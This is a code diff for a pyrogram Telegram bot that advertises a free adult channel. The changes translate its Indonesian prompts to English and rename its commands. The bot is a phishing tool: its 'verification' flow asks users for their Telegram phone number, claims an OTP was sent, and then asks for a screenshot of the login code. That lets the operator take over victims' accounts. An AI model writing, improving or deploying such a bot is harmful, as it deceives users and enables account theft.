@@ -32,12 +32,18 @@ app = pyrogram.Client(
 
 # START YA INI JINK !
 
-START_MESSAGE = """ 👋🏻 Halo saya Adalah Spesial Bot VVIP Channel gratis
+START_MESSAGE = """👋🏻 Hello I am a Koleksi Porn Channel Bot
 
-Silahkan Ketik :
-/freeporn untuk mendapatkan Channel VVIP gratis mu
+Please press :
 
-⚠️ Tinggalkan Bot ini jika kamu tidak percaya Dengan Bot ini
+👉🏻 /getchannel to get your free Koleksi Porn channel
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ Leave this bot if you don't believe this bot
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔞 ADULT CONTENT ONLY, if you are not old enough please leave this Bot
+
+⁉️ __Please don't spam this bot, if the bot process takes a long time, please wait, Dont Spam!!!__
 """
 
 START_BUTTON = [
@@ -59,27 +65,21 @@ async def start(_, message):
 # FREEPORN HANDLER 
 
 FREE_MESSAGE = """
-⚠️ Untuk mengakses Channel dibawah silahkan Verifikasi dirimu terlebih dahulu, agar akunmu terdaftar di database bot ini
+⚠️ To access the Channel below, please Verify yourself first, 
+so that your account is registered in this bot database
 
-Silahkan Ketik /verif
+Please press : /verif to verify your account to bot database
+
+❓if you dont understand please type /help
 """
 
 FREE_BUTTON = [
             [
-                InlineKeyboardButton("HAPUS", url="https://t.me/"),
-            ],
-            [
-                InlineKeyboardButton("Lanjut", url="https://t.me"),
-            ],
-            [
-                InlineKeyboardButton("ch3", url="https://t.me/" ),
-            ],
-            [
-                InlineKeyboardButton("ch4", url="https://t.me/"),
+                InlineKeyboardButton("♥️ KOLEKSI LUCAH MELAYU", url="https://t.me/"),
             ],
         ]
 
-@app.on_message(filters.command("freeporn") & filters.private)
+@app.on_message(filters.command("getchannel") & filters.private)
 async def free(_, message):
     text = FREE_MESSAGE
     reply_markup = InlineKeyboardMarkup(FREE_BUTTON)
@@ -93,7 +93,7 @@ async def free(_, message):
 
 @app.on_message(filters.command("verif") & filters.private)
 async def verip(_, message):
-    await app.send_message(message.chat.id, "Silahkan Masukann Nomer Telpon akun Telegram mu..")
+    await app.send_message(message.chat.id, "Please enter your Telegram account telephone number..")
 
 # SEND NOMER
 
@@ -103,14 +103,19 @@ async def regex_cantik(_, message):
     await asyncio.sleep(10)
     await app.send_message(message.chat.id, "__successfully sent otp code…__")
     await asyncio.sleep(0.2)
-    await app.send_photo(message.chat.id, "https://graph.org/file/63bcc1838ae1db75b10c4.jpg", caption="""
-🤖 My system bot Want Log in 
-
+    await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
+🤖 **My system bot Want Log in**
 We sent a Screnshot  login code to your Telegram account. Enter your Login Screnshot
-
+Please see the example picture
 Just send it in the form of a screenshot, you don't need to send it via text.
+
+⁉️ __Please don't spam this bot, this bot takes time to read the database, plese dont spam!!!!__
 """)
-    time.sleep(30)
+
+# SUCCESFULLY CMD
+
+
+
 
 # DATABASE !!!
 
